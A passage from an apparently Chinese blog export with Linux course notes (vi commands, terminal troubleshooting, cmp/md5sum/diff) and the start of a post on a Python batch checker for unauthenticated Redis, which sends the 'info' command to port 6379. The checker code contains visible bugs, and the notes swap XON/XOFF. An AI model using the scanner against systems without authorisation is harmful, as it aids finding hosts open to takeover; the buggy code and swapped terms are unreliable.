<p>在命令状态下，键盘输入解释成命令，<strong>按键无回显</strong>；输入冒号<code>:</code>后，可以输入<strong>行编辑命令</strong>（与不输入冒号<code>:</code>的命令是不一样的），<strong>按键有回显</strong>，按下回车键后才执行；i和a命令可以进入文本状态</p>
<p>在文本状态下，键盘输入解释为输入的文本，<strong>按键有回显</strong>，按下<strong>Esc</strong>键可以回到命令状态</p>
<p>课程中的一幅形象的图：<br><img src="/images/e411af14/1.png" alt="vi工作状态"></p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h4><p>可以使用以下两个编辑命令来进入文本状态：</p>
<ul>
<li><code>i</code> i是insert的缩写，意思是插入，在光标位置之前插入字符</li>
<li><code>a</code> a是append的缩写，意思是附加，在光标位置之后追加字符</li>
</ul>
<h4 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h4><p>在<strong>命令状态</strong>下，使用以下命令来移动光标：</p>
<ul>
<li><code>h</code> 左</li>
<li><code>j</code> 下</li>
<li><code>k</code> 上</li>
<li><code>l</code> 右</li>
</ul>
<p>经查阅，这种怪异的移动光标的方式是历史造成的，原因是旧时的键盘大多没有方向键。不过，现在vi编辑器一般可以<strong>使用方向键</strong>来移动光标</p>
<p>命令前加一个整数，表示这个命令连续执行多少遍，如：</p>
<ul>
<li><code>5h</code> 左移5列</li>
<li><code>6j</code> 下移6行<br>…</li>
</ul>
<h4 id="翻页"><a href="#翻页" class="headerlink" title="翻页"></a>翻页</h4><p>翻页使用的命令为：</p>
<ul>
<li><code>Ctrl-b</code> （按下Ctrl键和b键，不是输入Ctrl-b） 向后翻页 （字母b是backward的缩写，后退）</li>
<li><code>Ctrl-f</code> 向前翻页 （字母f是forward的缩写，前进）</li>
</ul>
<p>一般可以使用PgDn键（Page Down）代替Ctrl-f，用PgUp键（Page Up）代替Ctrl-b</p>
<p>也可以在命令前加上整数表示执行的次数，如：<code>6Ctrl-f</code>表示向前翻6页</p>
<h4 id="光标行内快速移动"><a href="#光标行内快速移动" class="headerlink" title="光标行内快速移动"></a>光标行内快速移动</h4><p>在行内快速移动光标的命令主要有以下几个：</p>
<ul>
<li><code>^</code> 移动光标至行首</li>
<li><code>$</code> 移动光标至行尾</li>
<li><code>w</code> 右移一个单词</li>
<li><code>b</code> 作移一个单词</li>
</ul>
<p>命令前加上整数的方式同样适用</p>
<h4 id="移动光标到指定行"><a href="#移动光标到指定行" class="headerlink" title="移动光标到指定行"></a>移动光标到指定行</h4><ul>
<li><code>:123</code> 将光标定位至123行</li>
<li><code>:$</code> 将光标定位至文件尾，即最后一行</li>
<li>描述行号时，<code>$</code>表示最后一行，圆点<code>.</code>表示当前行</li>
<li>将光标移动到一个括号上，按下<code>%</code>键可将光标定位至该括号匹配的括号上</li>
</ul>
<h4 id="其它常用命令"><a href="#其它常用命令" class="headerlink" title="其它常用命令"></a>其它常用命令</h4><p>这里列出其它常用的命令：</p>
<ul>
<li>删除命令：<ul>
<li><code>x</code> 删除当前光标处的一个字符，<code>5x</code>表示删除从当前光标开始的5个字符</li>
<li><code>dd</code> 删除当前行，<code>3dd</code>表示删除从当前行开始的3行</li>
</ul>
</li>
<li><code>r</code> 替换字符，<code>ra</code>表示将当前光标处的字符替换成a</li>
<li>撤销与重复：<ul>
<li><code>u</code> 撤销上一次编辑操作    </li>
<li>圆点键<code>.</code> 重复上一次编辑操作</li>
</ul>
</li>
<li>存盘：<ul>
<li><code>ZZ</code> 存盘退出</li>
<li><code>:wq</code> 存盘退出</li>
<li><code>:w</code> 存盘</li>
<li><code>:q!</code> 不存盘退出</li>
</ul>
</li>
<li>读取文件：<ul>
<li><code>:r file</code> 读入文件file的内容插入到当前行之后</li>
</ul>
</li>
<li>写入文件：<ul>
<li><code>:50,$w file</code> 把第50行到文件尾的内容写到file中</li>
<li><code>:50,$w! file</code> 同上，且强制覆盖</li>
</ul>
</li>
<li>剪贴板相关：<ul>
<li>剪切：<ul>
<li><code>:10,50d</code> 剪切第10～50行</li>
<li><code>:1,.d</code> 剪切文件首至当前行</li>
<li><code>:.,$d</code> 剪切整个文件</li>
</ul>
</li>
<li>拷贝：<ul>
<li><code>:10,50y</code> 拷贝10～50行</li>
</ul>
</li>
<li><code>p</code> 粘贴</li>
</ul>
</li>
<li>块操作：<ul>
<li><code>:5,10co56</code>复制第5～10行到第56行下</li>
<li><code>:8,34m78</code> 移动第8～34行到第78行下</li>
</ul>
</li>
<li><code>J</code> 将下面的一行合并到当前行</li>
<li><code>Ctrl-l</code> 刷行屏幕显示，字母l是load的缩写，译为“加载”</li>
<li><code>Ctrl-g</code> 状态显示，在屏幕最下面一行列出正在编辑的文件的名字，总行数，当前行号，文件是否被修改过等信息</li>
</ul>
<h3 id="模式查找"><a href="#模式查找" class="headerlink" title="模式查找"></a>模式查找</h3><p>这里将模式查找相关的操作独立写出来。</p>
<p>vi使用正则表达式来描述一个字符串模式</p>
<p>查找命令格式为：<code>/pattern</code>，如<code>/[0-9][0-9]*</code>表示查找数字；按下<code>n</code>可以向下继续查找，<code>N</code>则表示向上查找，当查找遇到文件尾则回到文件头继续搜索</p>
<h4 id="替换命令"><a href="#替换命令" class="headerlink" title="替换命令"></a>替换命令</h4><p>还可以使用模式查找来替换字符串，格式为：<code>:n1,n2s/pattern/string/flags</code></p>
<p>其中flags是选项，经查阅，flags有以下四个选项：</p>
<ul>
<li>c （confirm的缩写） 每次替换前询问</li>
<li>e （error的缩写） 不显示错误</li>
<li>g （globle的缩写） 全部替换；不加g选项，只替换每行的第一个匹配到的字符串</li>
<li>i （ignore的缩写） 忽略大小写</li>
</ul>
<p><strong>注意</strong>：选项可以合并使用</p>
<p>例：</p>
<ul>
<li><code>:1,50s/abc/xyz/</code> 将1～50行中出现的字符串abc替换成xyz</li>
<li><code>:50,80s/^/    /</code> 将第50～80行右移4列（缩进）</li>
<li><code>:1,$s/ *$//</code> 消除行尾多余空格</li>
</ul>
<p>转义符用<code>\</code>，分隔符不一定要使用<code>/</code>，可以使用<code>:</code>、<code>^</code>等，举例如下：<br>将buf.len/1000替换成buffer.size/1024可用以下的命令：</p>
<ul>
<li><code>:1,$s/buf\.len\/1000/buffer.size\/1024/g</code></li>
<li><code>1,$s:buf\.len/1000:buffer.size/1024:g</code></li>
<li><code>1,$s^buf\.len/1000^buffer.size/1024^g</code></li>
</ul>
<h4 id="和"><a href="#和" class="headerlink" title="\(和\)"></a><code>\(</code>和<code>\)</code></h4><p>在模式描述中增加<code>\(</code>和<code>\)</code>不影响匹配操作，但是替换字符串的时候可以使用<code>\1</code>，<code>\2</code>，<code>\3</code>等表示第一对<code>\(</code>和<code>\)</code>之间匹配到的内容，第二对，第三对……，<code>\0</code>表示匹配到的整个字符串</p>
<p>例如，替换C语言源程序文件中格式如“变量名-&gt;number”的字符串替换成“变量名-&gt;num”的格式，使用如下命令：<br><code>:1,$s/\([a-zA-Z][a-zA-Z0-9]*\)-&gt;number/\1-&gt;num/g</code></p>
<p>–</p>
<h2 id="疑难杂症"><a href="#疑难杂症" class="headerlink" title="疑难杂症"></a>疑难杂症</h2><h3 id="“死机”问题"><a href="#“死机”问题" class="headerlink" title="“死机”问题"></a>“死机”问题</h3><p>记录下刚开始使用vi/vim，因为不熟悉，可能导致“死机”的解决方式。</p>
<p>“死机”症状：vi编辑完后执行存盘操作，结果屏幕卡死，输入任何信息都没有响应</p>
<p>原因：vi编辑结束后按下Ctrl-S（大部分Windows编辑器的保存按键），Linux进入流量控制状态</p>
<p>解决方法：按下Ctrl-Q键解除流量控制</p>
<h4 id="RS232接口连接主机和终端时的流量控制方案"><a href="#RS232接口连接主机和终端时的流量控制方案" class="headerlink" title="RS232接口连接主机和终端时的流量控制方案"></a>RS232接口连接主机和终端时的流量控制方案</h4><p>源自历史原因，以前会出现终端显示速度跟不上主机发送的速度的现象，因为主机送来的数据打印出来的速度较慢，或者需要将屏幕显示的内容暂停显示来仔细分析，所以此时需要一种机制来控制主机发来的数据流量</p>
<p>有两种控制方法：</p>
<ul>
<li>硬件方式：使用RS232接口的CTS信号线（Clear To Send），但缺点是：需要在电缆中增加一条通信线</li>
<li>软件方式：利用流控字符Xon和Xoff，这是ASCII码表中的控制字符，ASCII码值分别为17和19</li>
</ul>
<p>而Ctrl-S按键发送Xon字符，Ctrl-Q按键发送Xoff字符</p>
<p>但是到了如今，网络虚拟终端在主机和终端之间使用TCP协议，TCP协议本身有流量控制的功能，终端显示速度落后于数据生成速度可以由TCP解决，而且如今因网速太快和缓冲等，很难将信息暂停到感兴趣的位置，故手动Xon/Xoff控制流量已经没什么用处了，但为了与历史机制的兼容仍保留了此机制。</p>
<hr>
<h3 id="“意外中止”问题"><a href="#“意外中止”问题" class="headerlink" title="“意外中止”问题"></a>“意外中止”问题</h3><p>症状：vi编辑结束后存盘，程序“意外中止”，且编辑成果丢失</p>
<p>原因：vi存盘命令ZZ按键为Shift-zz，误操作为Ctrl-zz，而Ctrl-z按键导致当前运行进程被<strong>挂起</strong>，进程暂停运行</p>
<p>解决方法：<br>    恢复进程运行即可，jobs命令可以查看当前bash后台的进程（作业）列表，使用如下命令可以恢复：<br>    + fg %1 将1号作业恢复到前台运行<br>    + %1 将1号作业恢复到前台运行</p>
<h3 id="退格键无法使用的问题"><a href="#退格键无法使用的问题" class="headerlink" title="退格键无法使用的问题"></a>退格键无法使用的问题</h3><p>症状：bash命令输入时，Backspace键可用，但是，运行自己写的程序时Backspace键无法正常使用</p>
<p>原因：当前终端的“行律”设置不正确</p>
<p>解决方法：<br>    Backspace按键对应的ASCII码是控制字符Ctrl-H，执行<code>stty erase ^H</code>，设定行律模块把Ctrl-H为删除符，以后Ctrl-H和Backspace都可以做删除。如果需要，把命令放到<code>$HOME/.bash_profile</code>中<br>    <code>stty -a</code>可以了解终端行律的状态</p>
<hr>
<h3 id="乱码问题"><a href="#乱码问题" class="headerlink" title="乱码问题"></a>乱码问题</h3><h4 id="屏幕显示乱码"><a href="#屏幕显示乱码" class="headerlink" title="屏幕显示乱码"></a>屏幕显示乱码</h4><p>症状：<code>cat /bin/bash</code>或<code>head -n 1 /bin/bash</code>导致屏幕乱码，键盘输入也只能看到画表用的制表符</p>
<p>原因：/bin/bash文件不是文本文件，这些二进制内容逐字节送到终端，凑巧一个序列被终端理解为一个转义序列，执行动作，修改了终端字符集</p>
<p>解决方法：</p>
<ul>
<li>断开连接，重复登录</li>
<li>注意不要把非文本信息在终端输出</li>
</ul>
<h4 id="文本文件格式问题"><a href="#文本文件格式问题" class="headerlink" title="文本文件格式问题"></a>文本文件格式问题</h4><p>症状：Linux下的文本文件在Windows用notepad（记事本）打开，所有内容粘在一行</p>
<p>原因：Linux和Windows的文本文件的存储格式不同</p>
<p>解决方法：在Linux完成格式转换后再用Windows处理，或者用Windows中可容忍Linux文本文件格式的其它编辑器</p>
<p>文本文件的存储格式：</p>
<ul>
<li>Linux：行尾处仅存换行符 \n</li>
<li>Windows：行尾处存回车和换行符 \r\n</li>
</ul>
<p>相关命令：dos2unix/unix2dos，todos/frodos、file（查看文件数据类型）</p>
<h4 id="中文编码问题"><a href="#中文编码问题" class="headerlink" title="中文编码问题"></a>中文编码问题</h4><p>症状：从Windows迁来的文件，只有在显示中文字符时是乱码。Linux本生的中文信息正常显示</p>
<p>原因：中文字符集GBK和UTF8不兼容，Windows使用GBK，而Linux使用UTF8</p>
<p>GBK编码：Windows默认中文编码方案，两个字节表示一个汉字，字节的最高位为1，以区别ASCII码（最高位为0）</p>
<p>UTF8编码：众多Linux默认中文编码方案，三个字节表示一个汉字，字节的最高位为1</p>
<p>转换编码方式（使用<strong>iconv</strong>命令）：</p>
<ul>
<li><code>iconv -f gbk -t utf8 file1 -o file2</code> 从gbk转换到utf8</li>
<li><code>iconv -f utf8 -t gbk file1 -o file2</code> 从utf8转换到gbk</li>
</ul>
<h4 id="终端乱码"><a href="#终端乱码" class="headerlink" title="终端乱码"></a>终端乱码</h4><p>症状：终端中文显示乱码</p>
<p>原因：还是字符集的问题</p>
<p>解决方法：调整终端仿真软件的终端类型和字符编码，具体方式与所用的软件有关</p>
]]></content>
      <categories>
        <category>MOOC课程学习·Linux开发环境及应用</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开发环境及应用·第三周·文件比较</title>
    <url>/5842b786/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本文整理了第三周课程有关文件比较的笔记</p>
<span id="more"></span>

<h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><h3 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h3><p>该命令用法为：<code>cmp file1 file2</code></p>
<p>该命令会逐字节比较两个文件的内容，当文件内容完全相同的时候，不给出任何的提示，也就是没有输出；当文件不同时，输出第一个不同的位置。</p>
<p>（此命令类似Windows中的COMP命令）</p>
<p>例：<br>有以下文件：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cat</span> test1.txt 
aasd
zxcaw
<span class="token number">456</span>
<span class="token number">1234</span>
as
$ <span class="token function">cat</span> test2.txt 
aasd
zxcaw
<span class="token number">456</span>
<span class="token number">1234</span>
as
$ <span class="token function">cat</span> test3.txt 
<span class="token number">123</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>文件test1.txt和test2.txt内容相同</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cmp</span> test1.txt test2.txt 
$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>文件test1.txt和test3.txt内容不同</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cmp</span> test1.txt test3.txt 
test1.txt test3.txt differ: byte <span class="token number">1</span>, line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="md5sum-sha1sum"><a href="#md5sum-sha1sum" class="headerlink" title="md5sum/sha1sum"></a>md5sum/sha1sum</h3><p>md5sum和sha1sum命令分别使用md5和sha-1算法生成文件的hash值，其中md5sum生成16字节hash值，sha1sum生成20字节hash值，通过比较hash值是否相同即可判断文件内容是否相同。</p>
<p>使用方法（以md5sum为例）：</p>
<ul>
<li><code>md5sum file1 file2 file3 ...</code> 计算文件的hash值</li>
<li><code>md5sum file1 &gt; test.sum</code>  将生成的test.sum文件放到另一台计算机上运行命令：<code>md5sum -c test.sum</code> 即可验证文件file1的完整性</li>
</ul>
<p>例：<br>计算上面提到的三个文件的hash值</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ md5sum test1.txt test2.txt test3.txt 
d08a81eeaf86e095fa5fbbbcb6936344  test1.txt
d08a81eeaf86e095fa5fbbbcb6936344  test2.txt
ba1f2511fc30423bdbb183fe33f3dd0f  test3.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>验证文件的完整性</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ md5sum test1.txt test2.txt test3.txt <span class="token operator">></span> test.sum
$ md5sum -c test.sum 
test1.txt: OK
test2.txt: OK
test3.txt: OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><p>此命令用于找出两个文件的差别</p>
<p>基本用法：</p>
<ul>
<li><code>diff file1 file2</code> 使用normal格式输出</li>
<li><code>diff -u file1 file2</code> 使用unified格式输出</li>
</ul>
<p>使用normal输出格式，将列出一个如何将file1转换成file2的指令，具体指令如下：</p>
<ul>
<li>a — add 添加</li>
<li>c — change 改变</li>
<li>d — delete 删除</li>
</ul>
<p>指令字母左边的行号是file1的行号，右面是file2的行号，列出内容的时候，大于号<code>&gt;</code>右边的内容是需要在file1文件中增加的内容；小于号<code>&lt;</code>右边的内容是需要从file1文件中删除的内容</p>
<p> 举个例子：<br> 现有以下文件：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cat</span> <span class="token number">1</span>.txt 
feather
feather
Lee
lee
feather
Linux
$ <span class="token function">cat</span> <span class="token number">2</span>.txt 
feather
feather
lee
abc
feather
LInux
hello
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用diff命令得到输出：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">diff</span> <span class="token number">1</span>.txt <span class="token number">2</span>.txt 
3d2
<span class="token operator">&lt;</span> Lee
4a4
<span class="token operator">></span> abc
6c6,7
<span class="token operator">&lt;</span> Linux
---
<span class="token operator">></span> LInux
<span class="token operator">></span> hello<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>删除文件file1第3行的内容<code>Lee</code>可得到文件file2的第2行，对应指令为：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">3d2
<span class="token operator">&lt;</span> Lee<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在文件file1的第4行添加内容<code>abc</code>可以得到文件file2的第4行，对应指令为：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">4a4
<span class="token operator">></span> abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>修改文件file1的第6行可变为file2的第6，7行，对应指令为：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">6c6,7
<span class="token operator">&lt;</span> Linux
---
<span class="token operator">></span> LInux
<span class="token operator">></span> hello<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>至于unified格式，这种格式和git版本管理使用的文件比较的输出类似，不详谈。</p>
<p><strong>重要应用</strong>：基于文件比较可以实现版本管理系统</p>
]]></content>
      <categories>
        <category>MOOC课程学习·Linux开发环境及应用</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>redis未授权访问批量验证脚本编写[python]</title>
    <url>/3b96e352/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>简单来说，redis是一个数据库。在默认的配置下，redis绑定在0.0.0.0:6379，也就是说，如果服务器有公网ip，可以通过访问其公网ip的6379端口来操作redis。最为致命的是，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器…</p>
<span id="more"></span>

<h3 id="漏洞的危害"><a href="#漏洞的危害" class="headerlink" title="漏洞的危害"></a>漏洞的危害</h3><ol>
<li>无密码验证登录redis后，可读取、删除、更改数据</li>
<li>攻击者可以通过redis读写文件，植入后门</li>
<li>如果redis以root权限运行，攻击者可以写入ssh公钥文件，然后即可远程ssh登录服务器<br>…</li>
</ol>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复方案大概有以下几种：</p>
<ol>
<li>把redis绑定在127.0.0.1即本地上</li>
<li>配置登录验证</li>
<li>防火墙设置白名单，拒绝不信任的连接<br>…</li>
</ol>
<hr>
<p>本文主要讲解验证脚本的编写，故不再过多阐述漏洞原理、利用等细节。</p>
<h2 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h2><p>登录redis后，执行info命令，可以获得类似下面的信息：</p>
<pre class="line-numbers language-none"><code class="language-none"># Server
redis_version:5.0.3
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:68e47d9309ff01ae
redis_mode:standalone
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果登录失败，是不可以执行命令的，所以我们可以向目标ip的6379（redis默认端口）发起连接，发送info命令，只要得到的响应中存在上面信息中的某些独特的字符串，如<code>redis_version</code>，我们就认为目标存在redis未授权访问漏洞。</p>
<p>代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建套接字</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">6379</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 连接</span>
    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 发送info命令</span>
    response <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收响应数据</span>
    <span class="token keyword">if</span> <span class="token string">'redis_version'</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
        result <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment"># 存在漏洞</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># 不存在漏洞</span>
<span class="token keyword">except</span> <span class="token punctuation">(</span>socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>：
    <span class="token comment"># 连接失败，可能端口6379未开放，或者被拦截，此时认为漏洞不存在</span>
    result <span class="token operator">=</span> <span class="token boolean">False</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>好了，现在的关键就在：如何发送info命令？</p>
<p>python有操作redis的第三方库，可以很方便的操作redis。然而，我们并不使用这些第三方库，归根结底，发送info命令其实是发送了一个可以让redis服务识别的特定的数据而已，只要我们知道这个数据是什么，我们就可以使用info命令了。</p>
<p>下面我们就来分析，redis是如何发送info命令的。</p>
<h3 id="截获info命令"><a href="#截获info命令" class="headerlink" title="截获info命令"></a>截获info命令</h3><p>我们需要搭建一个redis环境，使用抓包工具来截获使用info命令时redis发送的数据，为了方便，我使用了linux系统的命令netcat、tee来充当抓包工具，读者可以自己在linux系统下搭建redis环境尝试。</p>
<p>我们使用netcat连接到本地的redis服务，然后使用另一个netcat进程监听127.0.0.1:9000，将接受的连接发来的数据，重定向至连接到redis服务的netcat进程的输入，即可完成连接的转发，我们在这两个netcat经常之间，使用tee来截获数据，流程大致如下：</p>
<p><img src="/images/3b96e352/2.png" alt="流程"></p>
<p>在实际的操作中，我们还需要使用命名管道来实现双向通信，否则客户端无法接受到redis的登录响应就会阻塞，无法发生命令。</p>
<p>具体操作如下：</p>
<ol>
<li>启动redis服务</li>
<li>创建两个管道文件：pipe1、pipe2 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">mkfifo</span> pipe1
$ <span class="token function">mkfifo</span> pipe2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li>启动一个netcat进程监听在本地的9000端口上，以pipe1作为输入，输出重定向到tee进程，tee进程负责将数据输出到pipe2和屏幕上： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ ncat -l <span class="token number">127.0</span>.0.1 <span class="token number">9000</span> <span class="token operator">&lt;</span> pipe1 <span class="token operator">|</span> <span class="token function">tee</span> pipe2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>启动另一个终端，启动netcat进程，负责连接redis服务，以pipe2作为输入，输出重定向到pipe1中： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ ncat <span class="token number">127.0</span>.0.1 <span class="token number">6379</span> <span class="token operator">&lt;</span> pipe2 <span class="token operator">></span> pipe1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>用redis客户端连接本地9000端口： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">9000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>在redis-cli中发送info命令，tee进程在终端上的输出即为整个过程需要发送给redis的数据</li>
</ol>
<p>附上动图：<br><img src="/images/3b96e352/1.gif" alt="获取payload"></p>
<p>可以知道payload为：</p>
<pre class="line-numbers language-none"><code class="language-none">*1
$4
info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>写成python字节串就是：<code>b&#39;*1\r\n$4\r\ninfo\r\n&#39;</code> （<code>&#39;\r\n&#39;</code>是换行符）</p>
<p>所以我们只需使用socket发送以上字节串即可达到同样的效果</p>
<h3 id="编写验证poc"><a href="#编写验证poc" class="headerlink" title="编写验证poc"></a>编写验证poc</h3><p>验证漏洞的代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">poc</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> url2ip<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token comment"># 将url转换成ip地址</span>
    <span class="token keyword">if</span> url<span class="token punctuation">:</span>
        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">':'</span> <span class="token keyword">in</span> url <span class="token keyword">else</span> <span class="token number">6379</span> <span class="token comment"># redis默认端口是6379</span>
        host <span class="token operator">=</span> url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

        payload <span class="token operator">=</span> <span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">1</span>\r\n$<span class="token number">4</span>\r\ninfo\r\n' <span class="token comment"># 发送的数据</span>

        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
        socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># 设置超时时间</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 发送info命令</span>
            response <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

            <span class="token keyword">if</span> response <span class="token keyword">and</span> <span class="token string">'redis_version'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'%s:%s'</span><span class="token operator">%</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
    
    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中url转换成ip地址的函数如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">url2ip</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    url转换成ip
    argument: url
    return: 形如www.a.com:80格式的字符串 若转换失败则返回None
    """</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
